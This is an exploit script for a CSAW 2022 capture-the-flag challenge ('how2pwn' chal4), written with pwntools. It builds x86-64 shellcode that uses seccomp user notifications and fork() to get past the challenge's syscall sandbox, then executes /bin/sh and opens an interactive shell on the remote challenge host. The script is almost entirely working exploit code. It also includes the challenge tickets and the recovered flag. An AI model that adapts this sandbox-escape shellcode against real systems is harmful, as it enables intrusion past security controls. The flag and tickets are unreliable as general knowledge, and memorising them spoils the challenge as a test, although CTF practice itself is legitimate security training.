
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./public/bin/all/chal4')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

b *main

# call   rdx
hbreak *main+0x98
hbreak *0xcafe0000

# parent is the target. 
# child is the supervisor
set follow-fork-mode parent

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def craft_shellcode():
    shellcode = asm('''
    ENDBR64
    JMP start

    inline_memset:
    xor rax, rax

    inline_memset_loop:
    cmp rax, rdx
    jz inline_memset_exit
    mov byte ptr [rdi+rax], 0
    inc rax
    jmp inline_memset_loop

    inline_memset_exit:
    ret

    start:
    PUSH       RBP
    MOV        RBP,RSP
    PUSH       R15
    PUSH       R14
    PUSH       R13
    PUSH       R12
    SUB        RSP,0xe0
    
    // ebpf filter
    MOV        qword ptr [RBP + -0x28],RAX
    XOR        EAX,EAX
    MOV        word ptr [RBP + -0x80],0x20
    MOV        byte ptr [RBP + -0x7e],0x0
    MOV        byte ptr [RBP + -0x7d],0x0
    MOV        dword ptr [RBP + -0x7c],0x0
    MOV        word ptr [RBP + -0x78],0x15
    MOV        byte ptr [RBP + -0x76],0x0
    MOV        byte ptr [RBP + -0x75],0x1
    MOV        dword ptr [RBP + -0x74],0x13d
    MOV        word ptr [RBP + -0x70],0x6
    MOV        byte ptr [RBP + -0x6e],0x0
    MOV        byte ptr [RBP + -0x6d],0x0
    MOV        dword ptr [RBP + -0x6c],0x7fff0000
    MOV        word ptr [RBP + -0x68],0x15
    MOV        byte ptr [RBP + -0x66],0x0
    MOV        byte ptr [RBP + -0x65],0x1
    MOV        dword ptr [RBP + -0x64],0x39
    MOV        word ptr [RBP + -0x60],0x6
    MOV        byte ptr [RBP + -0x5e],0x0
    MOV        byte ptr [RBP + -0x5d],0x0
    MOV        dword ptr [RBP + -0x5c],0x7fff0000
    MOV        word ptr [RBP + -0x58],0x15
    MOV        byte ptr [RBP + -0x56],0x0
    MOV        byte ptr [RBP + -0x55],0x1
    MOV        dword ptr [RBP + -0x54],0x10
    MOV        word ptr [RBP + -0x50],0x6
    MOV        byte ptr [RBP + -0x4e],0x0
    MOV        byte ptr [RBP + -0x4d],0x0
    MOV        dword ptr [RBP + -0x4c],0x7fff0000
    MOV        word ptr [RBP + -0x48],0x15
    MOV        byte ptr [RBP + -0x46],0x0
    MOV        byte ptr [RBP + -0x45],0x1
    MOV        dword ptr [RBP + -0x44],0x3c
    MOV        word ptr [RBP + -0x40],0x6
    MOV        byte ptr [RBP + -0x3e],0x0
    MOV        byte ptr [RBP + -0x3d],0x0
    MOV        dword ptr [RBP + -0x3c],0x7fff0000
    MOV        word ptr [RBP + -0x38],0x6
    MOV        byte ptr [RBP + -0x36],0x0
    MOV        byte ptr [RBP + -0x35],0x0
    MOV        dword ptr [RBP + -0x34],0x7fc00000
    MOV        word ptr [RBP + -0x90],0xa
    LEA        RAX,[RBP + -0x80]
    MOV        qword ptr [RBP + -0x88],RAX
    LEA        RAX,[RBP + -0x90]

    // seccomp(SECCOMP_SET_MODE_FILTER,SECCOMP_FILTER_FLAG_NEW_LISTENER	,&prog);
    MOV        RCX,RAX
    MOV        EDX,0x8
    MOV        ESI,0x1
    MOV        EDI,0x13d
    MOV        EAX,0x0
    mov rdi, rsi
    mov rsi, rdx
    mov rdx, rcx
    mov eax, 317
    syscall

    MOV        dword ptr [RBP + -0xd4],EAX
    MOV        EAX,dword ptr [RBP + -0xd4]
    MOV        dword ptr [RBP + -0xd0],EAX

    // fork()
    mov eax, 57
    syscall

    // seccomp(SECCOMP_GET_NOTIF_SIZES,0,&sizes);
    MOV        dword ptr [RBP + -0xcc],EAX
    CMP        dword ptr [RBP + -0xcc],0x0
    JNZ        LAB_001018b1

    /**************** child - monitor process *****************/
    LEA        RAX,[RBP + -0xc6]
    MOV        RCX,RAX
    MOV        EDX,0x0
    MOV        ESI,0x3
    MOV        EDI,0x13d
    mov rdi, rsi
    mov rsi, rdx
    mov rdx, rcx
    mov eax, 317
    syscall

    mov qword ptr [RBP + -0xa8], 0xcafea00 /* notif_buffer */
    mov qword ptr [RBP + -0xb8], 0xcafeb00 /* response_buffer */

    //while(1)
    LAB_001017d3:
    MOV        RDI,qword ptr [RBP + -0xb8]
    xor rsi, rsi
    MOV        RDX,0x400
    call inline_memset

    // ioctl(listening_fd, SECCOMP_IOCTL_NOTIF_RECV, notif_buffer);
    MOV        RDX,qword ptr [RBP + -0xb8]
    MOV        EAX,dword ptr [RBP + -0xd0]
    MOV        ECX,0xc0502100
    MOV        RSI,RCX
    MOV        EDI,EAX
    MOV        EAX,16
    syscall

    //ioctl(listening_fd, SECCOMP_IOCTL_NOTIF_SEND, response_buffer);
    MOV        RAX,qword ptr [RBP + -0xb8]
    MOV        qword ptr [RBP + -0xa0],RAX
    MOV        RAX,qword ptr [RBP + -0xa8]
    MOV        qword ptr [RBP + -0x98],RAX
    MOV        RAX,qword ptr [RBP + -0xa0]
    MOV        RDX,qword ptr [RAX]
    MOV        RAX,qword ptr [RBP + -0x98]
    MOV        qword ptr [RAX],RDX
    MOV        RAX,qword ptr [RBP + -0x98]
    MOV        dword ptr [RAX + 0x10],0x0
    MOV        RAX,qword ptr [RBP + -0x98]
    MOV        dword ptr [RAX + 0x14],0x1
    MOV        RAX,qword ptr [RBP + -0x98]
    MOV        qword ptr [RAX + 0x8],0x0
    MOV        RDX,qword ptr [RBP + -0xa8]
    MOV        EAX,dword ptr [RBP + -0xd0]
    MOV        ECX,0xc0182101
    MOV        RSI,RCX
    MOV        EDI,EAX
    MOV        EAX,16
    syscall
    JMP        LAB_001017d3

    /**************** parent - target process *****************/
    LAB_001018b1:

    // close(listening_fd);
    MOV        EDI,EAX
    mov eax, 3
    syscall
    
    //dummy print to verify that the seccomp bypass works
    MOV        EDX,0x16
    mov rax, 0x41424344
    push rax
    mov rsi, rsp
    MOV        EDI,0x1
    mov eax, 1
    syscall
    pop rax

    // SHELLCODEEEEEE
    xor     rdx, rdx
    lea rbx, [rip+binsh]
    mov     rdi, rbx
    push    rdx
    push    rbx
    mov     rsi, rsp
    mov     eax, 0x3b
    syscall

    hang:
    jmp hang

    /************* Data section *************/
    binsh:
    .ascii "/bin/sh\\0"

    // exit stuff. probably unnecessary
    POP        R12
    POP        R13
    POP        R14
    POP        R15
    POP        RBP
    RET
    ''')
    
    print(f'Shellcode is {hex(len(shellcode))}/0x1000 bytes long')
    padded_shellcode = shellcode + b'\x90'*(0x1000 - len(shellcode)) # pad with NOPs.
    assert(len(padded_shellcode) == 0x1000)
    return padded_shellcode

ticket1 = b'764fce03d863b5155db4af260374acc1'
ticket2 = b'8e7bd9e37e38a85551d969e29b77e1ce'
ticket3 = b'7a01505a0cfefc2f8249cb24e01a2890'

# nikos@ctf-box:~/ctfs/csaw22/pwn/how2pwn$ seccomp-tools dump ./public/bin/all/chal4
# 7a01505a0cfefc2f8249cb24e01a2890
# Enter your shellcode:
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0001: 0x15 0x00 0x01 0x0000013d  if (A != seccomp) goto 0003
#  0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0003: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0005
#  0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0005: 0x15 0x00 0x01 0x00000010  if (A != ioctl) goto 0007
#  0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0007: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0009
#  0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0009: 0x06 0x00 0x00 0x7ff00000  return TRACE

if args['REMOTE']:
    remote_server = 'how2pwn.chal.csaw.io'
    remote_port = 60004
    io = remote(remote_server, remote_port)
else:
    io = start()

shellcode = craft_shellcode()

io.send(ticket3)
io.recvuntil(b'Enter your shellcode: ')

io.send(shellcode)

io.interactive()
io.close()

# Found FLAG: flag{8d13cfa357978684be9809172d3033ce739015f5}